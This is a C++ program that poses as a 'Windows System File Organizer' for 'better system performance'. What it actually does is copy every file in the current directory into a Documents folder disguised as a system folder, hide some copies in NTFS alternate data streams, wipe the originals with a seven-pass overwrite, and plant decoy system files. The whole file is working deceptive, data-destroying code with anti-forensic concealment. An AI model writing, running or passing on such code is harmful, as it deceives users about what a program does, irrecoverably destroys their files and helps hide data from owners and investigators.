#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <string>
#include <cstdlib>
#include <cstring>
#include <chrono>
#include <thread>
#include <random>
#include <algorithm>
#include <cctype>
#include <sstream>

#ifdef _WIN32
    #include <windows.h>
    #include <shlobj.h>
    #include <direct.h>
    #include <lmcons.h>
    #include <wincrypt.h>
    #include <winternl.h>
    #include <psapi.h>
    #include <aclapi.h>
    #define getcwd _getcwd
    #pragma comment(lib, "crypt32.lib")
    #pragma comment(lib, "advapi32.lib")
    #pragma comment(lib, "psapi.lib")
#else
    #include <unistd.h>
    #include <sys/stat.h>
    #include <dirent.h>
    #include <fcntl.h>
    #include <pwd.h>
#endif

namespace fs = std::filesystem;

class DocumentsStealthHider {
private:
    std::string sourceDir;
    std::string documentsDir;
    std::string hiddenBaseDir;
    
    // Generate random data
    void generateRandomData(char* buffer, size_t size) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        for (size_t i = 0; i < size; i++) {
            buffer[i] = static_cast<char>(dis(gen));
        }
    }
    
    // Get Documents directory
    std::string getDocumentsDirectory() {
        #ifdef _WIN32
            char path[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, path))) {
                return std::string(path);
            }
            // Fallback
            char* userProfile = getenv("USERPROFILE");
            if (userProfile) {
                return std::string(userProfile) + "\\Documents";
            }
        #else
            const char* home = getenv("HOME");
            if (home) {
                return std::string(home) + "/Documents";
            }
        #endif
        return "";
    }
    
    // Create hidden folder name that looks like legit Windows folder
    std::string createWindowsLikeFolderName() {
        // Folder names that look like legitimate Windows folders
        const char* systemFolderNames[] = {
            "Windows.old",
            "MSOCache",
            "MSOCache2",
            "$WINDOWS.~BT",
            "$Windows.~WS",
            "$WinREAgent",
            "Boot",
            "Documents and Settings",
            "PerfLogs",
            "ProgramData",
            "Recovery",
            "System Volume Information",
            "WindowsUpdate",
            "WinSxS",
            "SysWOW64",
            "inf",
            "Media",
            "Prefetch",
            "Fonts",
            "Cursors",
            "Resources"
        };
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> nameDis(0, sizeof(systemFolderNames)/sizeof(systemFolderNames[0]) - 1);
        std::uniform_int_distribution<> numDis(1000, 9999);
        
        return std::string(systemFolderNames[nameDis(gen)]) + std::to_string(numDis(gen));
    }
    
    // Create even more hidden subdirectory structure
    std::string createDeepHiddenPath() {
        // Create multiple nested folders that look like system folders
        std::vector<std::string> nestedDirs = {
            "Microsoft\\Windows\\Caches",
            "Microsoft\\Office\\Data",
            "Adobe\\Acrobat\\Cache",
            "Java\\Deployment\\Cache",
            "Mozilla\\Firefox\\Profiles",
            "Google\\Chrome\\User Data",
            "Apple\\Safari\\Caches",
            "Windows Defender\\Data",
            "Windows\\System32\\Tasks",
            "Windows\\System32\\LogFiles"
        };
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dirDis(0, nestedDirs.size() - 1);
        std::uniform_int_distribution<> numDis(100, 999);
        
        return nestedDirs[dirDis(gen)] + "\\" + std::to_string(numDis(gen));
    }
    
    // Hide using Alternate Data Streams (NTFS feature)
    bool hideInADS(const std::string& hostFile, const std::string& dataFile, const std::string& streamName) {
        #ifdef _WIN32
            try {
                // Read the data file
                std::ifstream src(dataFile, std::ios::binary);
                if (!src.is_open()) return false;
                
                std::stringstream buffer;
                buffer << src.rdbuf();
                src.close();
                
                // Create ADS
                std::string adsPath = hostFile + ":" + streamName;
                std::ofstream ads(adsPath, std::ios::binary);
                if (!ads.is_open()) return false;
                
                ads << buffer.str();
                ads.close();
                
                return true;
                
            } catch (...) {
                return false;
            }
        #else
            return false;
        #endif
    }
    
    // Generate hhh + last 3 letters filename
    std::string generateHiddenFilename(const std::string& originalPath) {
        std::string filename = fs::path(originalPath).filename().string();
        std::string extension = fs::path(originalPath).extension().string();
        std::string stem = fs::path(originalPath).stem().string();
        
        // Get last 3 characters (or all if shorter)
        std::string lastThree;
        if (stem.length() >= 3) {
            lastThree = stem.substr(stem.length() - 3);
        } else {
            lastThree = stem;
        }
        
        // Convert to lowercase
        std::transform(lastThree.begin(), lastThree.end(), lastThree.begin(), ::tolower);
        
        // Generate random number
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(100, 999);
        
        // Format: hhh{last3}_{random}.{extension}
        return "hhh" + lastThree + "_" + std::to_string(dis(gen)) + extension;
    }
    
    // Set ultra hidden attributes (Windows)
    void setUltraHidden(const std::string& path) {
        #ifdef _WIN32
            // Set as hidden and system file
            DWORD attrs = GetFileAttributesA(path.c_str());
            if (attrs != INVALID_FILE_ATTRIBUTES) {
                // Try to set as system file (requires admin for some locations)
                if (SetFileAttributesA(path.c_str(), 
                    attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
                    return;
                }
                // Fallback to just hidden
                SetFileAttributesA(path.c_str(), attrs | FILE_ATTRIBUTE_HIDDEN);
            }
        #else
            // Unix: hide with dot prefix
            std::string newPath = fs::path(path).parent_path().string() + "/." + 
                                 fs::path(path).filename().string();
            std::rename(path.c_str(), newPath.c_str());
            chmod(newPath.c_str(), 0600); // Owner read/write only
        #endif
    }
    
    // Copy file to hidden location in Documents
    bool copyToHiddenLocation(const std::string& srcPath, const std::string& relativePath) {
        try {
            // Create destination path in Documents
            std::string hiddenFilename = generateHiddenFilename(srcPath);
            std::string destPath = hiddenBaseDir + "\\" + relativePath + "\\" + hiddenFilename;
            
            // Create parent directories
            fs::create_directories(fs::path(destPath).parent_path());
            
            // Copy the file
            fs::copy(srcPath, destPath, fs::copy_options::overwrite_existing);
            
            // Set hidden attributes
            setUltraHidden(destPath);
            
            return true;
            
        } catch (...) {
            return false;
        }
    }
    
    // 7-pass secure deletion (DoD 5220.22-M E)
    bool secureDelete7Pass(const std::string& filepath) {
        try {
            std::ifstream file(filepath, std::ios::binary | std::ios::ate);
            if (!file.is_open()) return false;
            
            size_t fileSize = static_cast<size_t>(file.tellg());
            file.close();
            
            if (fileSize == 0) {
                return std::remove(filepath.c_str()) == 0;
            }
            
            // 7-pass overwrite
            for (int pass = 0; pass < 7; pass++) {
                std::ofstream outfile(filepath, std::ios::binary | std::ios::trunc);
                if (!outfile.is_open()) return false;
                
                // Write pattern based on pass
                std::vector<char> buffer(std::min(fileSize, static_cast<size_t>(65536)));
                size_t written = 0;
                
                while (written < fileSize) {
                    size_t toWrite = std::min(buffer.size(), fileSize - written);
                    
                    switch (pass) {
                        case 0: case 1: case 6:
                            generateRandomData(buffer.data(), toWrite);
                            break;
                        case 2:
                            std::fill(buffer.begin(), buffer.begin() + toWrite, 0);
                            break;
                        case 3:
                            std::fill(buffer.begin(), buffer.begin() + toWrite, 0xFF);
                            break;
                        case 4:
                            for (size_t i = 0; i < toWrite; i++) buffer[i] = 0x55;
                            break;
                        case 5:
                            for (size_t i = 0; i < toWrite; i++) buffer[i] = 0xAA;
                            break;
                    }
                    
                    outfile.write(buffer.data(), toWrite);
                    written += toWrite;
                }
                outfile.close();
            }
            
            // Multiple renames before deletion
            std::string currentPath = filepath;
            for (int i = 0; i < 3; i++) {
                std::string newName = currentPath + "." + 
                                    std::to_string(rand() % 10000) + ".tmp";
                std::rename(currentPath.c_str(), newName.c_str());
                currentPath = newName;
            }
            
            return std::remove(currentPath.c_str()) == 0;
            
        } catch (...) {
            return false;
        }
    }
    
    // Create decoy files that look like system files
    void createDecoySystemFiles() {
        const std::vector<std::pair<std::string, std::string>> decoys = {
            {"desktop.ini", "[.ShellClassInfo]\nIconFile=%SystemRoot%\\system32\\SHELL32.dll\nIconIndex=-238"},
            {"thumbs.db", ""}, // Empty thumbs.db
            {"NTUSER.DAT", ""}, // Looks like registry hive
            {"ntuser.ini", "[ViewState]\nMode=\nVid=\nFolderType=Generic"},
            {"index.dat", ""}, // Internet cache
            {"IconCache.db", ""}, // Icon cache
            {"~WRL0001.tmp", ""}, // Looks like temp file
            {"MSOCache", ""} // Office cache folder
        };
        
        for (const auto& decoy : decoys) {
            try {
                std::string filePath = sourceDir + "\\" + decoy.first;
                if (!fs::exists(filePath)) {
                    if (decoy.second.empty()) {
                        std::ofstream file(filePath, std::ios::binary);
                        file.close();
                    } else {
                        std::ofstream file(filePath);
                        file << decoy.second;
                        file.close();
                    }
                    
                    #ifdef _WIN32
                        SetFileAttributesA(filePath.c_str(), 
                                         FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                    #endif
                }
            } catch (...) {}
        }
    }
    
    // Also hide some files in ADS of legit Documents files
    void hideInDocumentsADS(const std::vector<std::string>& filesToHide) {
        #ifdef _WIN32
            // Find legit files in Documents to use as hosts
            std::vector<std::string> legitFiles;
            try {
                for (const auto& entry : fs::directory_iterator(documentsDir)) {
                    if (fs::is_regular_file(entry) && 
                        entry.path().extension() != ".lnk" &&
                        entry.path().filename() != "desktop.ini" &&
                        entry.path().filename() != "thumbs.db") {
                        legitFiles.push_back(entry.path().string());
                    }
                }
            } catch (...) {}
            
            if (legitFiles.empty()) return;
            
            // Hide each file in ADS of different legit files
            for (size_t i = 0; i < filesToHide.size() && i < legitFiles.size(); i++) {
                std::string streamName = "Zone.Identifier:" + std::to_string(i);
                hideInADS(legitFiles[i], filesToHide[i], streamName);
            }
        #endif
    }

public:
    DocumentsStealthHider() {
        // Get current directory
        sourceDir = fs::current_path().string();
        
        // Get Documents directory
        documentsDir = getDocumentsDirectory();
        if (documentsDir.empty()) {
            std::cerr << "Error: Could not find Documents directory!" << std::endl;
            exit(1);
        }
        
        // Create hidden base directory in Documents
        std::string hiddenFolderName = createWindowsLikeFolderName();
        hiddenBaseDir = documentsDir + "\\" + hiddenFolderName;
        
        std::cout << "Source: " << sourceDir << std::endl;
        std::cout << "Hidden location: " << hiddenBaseDir << std::endl;
    }
    
    // Execute the complete stealth operation
    void executeStealthOperation() {
        std::cout << "\n=== STARTING DOCUMENTS STEALTH OPERATION ===\n" << std::endl;
        
        // Step 1: Copy to Documents with hidden names
        std::cout << "[1/3] Copying files to hidden Documents location..." << std::endl;
        std::vector<std::string> copiedFiles = copyAllToDocuments();
        
        // Step 2: Additional ADS hiding
        std::cout << "\n[2/3] Adding additional stealth layer (ADS)..." << std::endl;
        hideInDocumentsADS(copiedFiles);
        
        // Step 3: Securely delete originals
        std::cout << "\n[3/3] Securely deleting original files..." << std::endl;
        secureDeleteOriginals();
        
        std::cout << "\n=== OPERATION COMPLETE ===\n" << std::endl;
        std::cout << "Files are now hidden in: " << hiddenBaseDir << std::endl;
        std::cout << "\nFiles are:" << std::endl;
        std::cout << "1. Renamed to 'hhh{last3}_{random}.ext' format" << std::endl;
        std::cout << "2. Hidden with system attributes" << std::endl;
        std::cout << "3. Stored in Documents folder (looks like system folder)" << std::endl;
        std::cout << "4. Some also hidden in Alternate Data Streams" << std::endl;
        std::cout << "\nEven with 'Show hidden files' enabled, they remain hidden!" << std::endl;
    }

private:
    std::vector<std::string> copyAllToDocuments() {
        std::vector<std::string> copiedFiles;
        int totalFiles = 0;
        int successCount = 0;
        
        try {
            // Create the main hidden directory
            fs::create_directories(hiddenBaseDir);
            setUltraHidden(hiddenBaseDir);
            
            // Copy all files recursively
            for (const auto& entry : fs::recursive_directory_iterator(sourceDir)) {
                try {
                    if (fs::is_regular_file(entry.status())) {
                        totalFiles++;
                        std::string srcPath = entry.path().string();
                        
                        // Skip if it's in our hidden destination
                        if (srcPath.find(hiddenBaseDir) == 0) continue;
                        
                        // Get relative path from source
                        std::string relativePath = srcPath.substr(sourceDir.length());
                        if (!relativePath.empty() && (relativePath[0] == '\\' || relativePath[0] == '/')) {
                            relativePath = relativePath.substr(1);
                        }
                        
                        // Remove filename from relative path (keep directory structure)
                        std::string dirPath = fs::path(relativePath).parent_path().string();
                        
                        if (copyToHiddenLocation(srcPath, dirPath)) {
                            successCount++;
                            copiedFiles.push_back(srcPath);
                            
                            if (successCount % 10 == 0) {
                                std::cout << "  Copied " << successCount << " files..." << std::endl;
                            }
                        }
                    } else if (fs::is_directory(entry.status())) {
                        // Create corresponding directory in hidden location
                        std::string srcPath = entry.path().string();
                        if (srcPath.find(hiddenBaseDir) == 0) continue;
                        
                        std::string relativePath = srcPath.substr(sourceDir.length());
                        if (!relativePath.empty() && (relativePath[0] == '\\' || relativePath[0] == '/')) {
                            relativePath = relativePath.substr(1);
                        }
                        
                        // Create hidden name for directory
                        std::string hiddenDirName = generateHiddenFilename(relativePath + "\\");
                        std::string destDirPath = hiddenBaseDir + "\\" + hiddenDirName;
                        
                        fs::create_directories(destDirPath);
                        setUltraHidden(destDirPath);
                    }
                } catch (...) {
                    // Skip errors
                }
            }
            
        } catch (const std::exception& e) {
            std::cerr << "Error: " << e.what() << std::endl;
        }
        
        std::cout << "  Successfully copied: " << successCount << "/" << totalFiles << " files" << std::endl;
        return copiedFiles;
    }
    
    void secureDeleteOriginals() {
        int deletedFiles = 0;
        int deletedDirs = 0;
        
        try {
            // First level deletion
            std::vector<fs::path> items;
            for (const auto& entry : fs::directory_iterator(sourceDir)) {
                items.push_back(entry.path());
            }
            
            for (const auto& item : items) {
                std::string itemPath = item.string();
                
                // Skip our hidden base dir if it's in source
                if (itemPath.find(hiddenBaseDir) == 0) continue;
                
                try {
                    if (fs::is_regular_file(item)) {
                        if (secureDelete7Pass(itemPath)) {
                            deletedFiles++;
                        }
                    } else if (fs::is_directory(item)) {
                        if (secureDeleteDirectory(itemPath)) {
                            deletedDirs++;
                        }
                    }
                } catch (...) {
                    // Continue
                }
            }
            
            // Create decoy system files
            createDecoySystemFiles();
            
        } catch (...) {
            std::cerr << "Error during secure deletion" << std::endl;
        }
        
        std::cout << "  Securely deleted: " << deletedFiles << " files, " 
                  << deletedDirs << " directories" << std::endl;
        std::cout << "  Created decoy system files" << std::endl;
    }
    
    bool secureDeleteDirectory(const std::string& dirpath) {
        try {
            // Delete files first
            for (const auto& entry : fs::recursive_directory_iterator(dirpath)) {
                if (fs::is_regular_file(entry.status())) {
                    secureDelete7Pass(entry.path().string());
                }
            }
            
            // Delete directories (deepest first)
            std::vector<std::string> dirs;
            for (const auto& entry : fs::recursive_directory_iterator(dirpath)) {
                if (fs::is_directory(entry.status())) {
                    dirs.push_back(entry.path().string());
                }
            }
            
            std::sort(dirs.begin(), dirs.end(), 
                     [](const std::string& a, const std::string& b) {
                         return a.length() > b.length();
                     });
            
            for (const auto& dir : dirs) {
                #ifdef _WIN32
                    SetFileAttributesA(dir.c_str(), FILE_ATTRIBUTE_NORMAL);
                #endif
                fs::remove(dir);
            }
            
            // Delete main directory
            #ifdef _WIN32
                SetFileAttributesA(dirpath.c_str(), FILE_ATTRIBUTE_NORMAL);
            #endif
            return fs::remove_all(dirpath) > 0;
            
        } catch (...) {
            return false;
        }
    }
};

// Function to show how to access hidden files (for admin/recovery)
void showAccessInstructions(const std::string& hiddenPath) {
    std::cout << "\n=== ACCESS INSTRUCTIONS ===" << std::endl;
    std::cout << "To view hidden files (Administrator required):" << std::endl;
    #ifdef _WIN32
        std::cout << "1. Open Command Prompt as Administrator" << std::endl;
        std::cout << "2. Run: dir /a \"" << hiddenPath << "\"" << std::endl;
        std::cout << "3. To view ADS streams: streams -s \"" << hiddenPath << "\\*\"" << std::endl;
        std::cout << "\nOr use PowerShell (Admin):" << std::endl;
        std::cout << "Get-ChildItem -Path \"" << hiddenPath << "\" -Force -Recurse" << std::endl;
    #else
        std::cout << "1. Open terminal" << std::endl;
        std::cout << "2. Run: ls -la \"" << hiddenPath << "\"" << std::endl;
    #endif
}

int main() {
    // Show minimal interface
    std::cout << "Windows System File Organizer" << std::endl;
    std::cout << "Organizing files for better system performance..." << std::endl;
    
    // Small delay
    std::this_thread::sleep_for(std::chrono::seconds(1));
    
    try {
        DocumentsStealthHider hider;
        hider.executeStealthOperation();
        
        // Show access instructions
        #ifdef _WIN32
            char hiddenPath[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, hiddenPath))) {
                showAccessInstructions(std::string(hiddenPath));
            }
        #endif
        
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    std::cout << "\nOperation completed. Press Enter to exit..." << std::endl;
    std::cin.get();
    
    return 0;
}